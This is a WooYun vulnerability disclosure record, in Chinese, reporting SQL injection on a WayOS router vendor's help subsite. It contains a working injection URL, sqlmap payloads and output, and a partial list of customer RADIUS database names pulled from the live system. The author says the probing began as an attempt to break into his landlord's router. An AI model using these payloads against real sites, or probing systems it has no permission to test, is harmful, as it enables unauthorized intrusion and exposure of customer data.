{"id": 48366, "wybug_id": "wooyun-2014-083277", "wybug_title": "由一个注入引发的血案（维盟路由储存客户radius信息）", "wybug_corp": "www.wayos.cn", "wybug_author": "路人甲", "wybug_date": "2014-11-14 19:58", "wybug_open_date": "2014-12-29 20:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-14：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 房东给我拉了网线，坑爹的网速100k/s，收我￥50/月本来想突破房东的路由，发现是wayos。到官网溜溜 详细说明：  在子站下发现一枚注入\nhttp://help.wayos.cn//detail.php?hp_id=51%20and%201=2%20union%20select%201,concat%28user%28%29,0x20,database%28%29,0x20,version%28%29%29,3,4,5,6,7,8,9,10,11\n\n\n   漏洞证明：  使用sqlmap跑了一下\nsqlmap identified the following injection points with a total of 43 HTTP(s) requests:---Place: GETParameter: hp_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: hp_id=47 AND 9686=9686    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: hp_id=47 AND (SELECT 6038 FROM(SELECT COUNT(*),CONCAT(0x3a736b6a3a,(SELECT (CASE WHEN (6038=6038) THEN 1 ELSE 0 END)),0x3a7670693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: hp_id=47 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a736b6a3a,0x486c4143774e454a534c,0x3a7670693a), NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: hp_id=47 AND SLEEP(5)---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: hp_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: hp_id=47 AND 9686=9686    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: hp_id=47 AND (SELECT 6038 FROM(SELECT COUNT(*),CONCAT(0x3a736b6a3a,(SELECT (CASE WHEN (6038=6038) THEN 1 ELSE 0 END)),0x3a7670693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: hp_id=47 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a736b6a3a,0x486c4143774e454a534c,0x3a7670693a), NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: hp_id=47 AND SLEEP(5)---\n然后发现了数据库里居然有差不多6000个database，我勒个去，这都是什么啊数据库名：客户对wayos产品的命名+Radius\navailable databases [5984]:[*] a00jian_Radius[*] A023A_Radius[*] a03551_Radius[*] a10000_Radius[*] a100144_Radius[*] a10104091_Radius[*] a102699_Radius[*] a107258222_Radius[*] a109738668_Radius[*] a111111112_Radius[*] a11111111_Radius[*] a11111_Radius[*] a1111_Radius[*] a112013_Radius[*] a11788_Radius.......................................[*] zzq520_Radius[*] zzqjsy_Radius[*] zzsj0371_Radius[*] zzvnet_Radius[*] zzxqcdc_Radius[*] zzy1981_Radius[*] zzy8202003_Radius[*] zzzfan007_Radius\n   修复方案：  #1，先修复注入   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-12-30 08:29 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  不仔细看我还以为是绿盟....    \n     2014-12-30 13:25 |    \t\tV-King \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:7        | 我是静静)\t\t \n  不仔细看我还以为是绿盟....     \n     2014-12-30 13:47 |    \t\t阿一 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | \\)\t\t \n  不仔细看我还以为是绿盟....    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}